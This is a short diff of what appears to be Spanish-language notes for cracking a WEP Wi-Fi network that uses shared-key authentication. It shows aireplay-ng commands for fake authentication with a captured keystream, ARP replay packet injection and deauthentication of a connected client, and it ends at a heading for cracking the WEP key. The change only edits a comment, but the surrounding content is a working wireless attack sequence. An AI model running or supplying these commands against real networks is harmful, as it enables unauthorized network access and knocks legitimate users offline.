@@ -105,7 +105,7 @@ aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac -y $shared_key_xor $wlan0
 //Ataque de ARP replay
 aireplay-ng -3 -b $bssid -h $wlan0_mac $wlan0
 
-volver hacer la deautenticacion
+//volver hacer la deautenticacion para que incremente la data y los paquetes de arp replay
 aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
 
 //Crackeo de contraseña WEP SKA
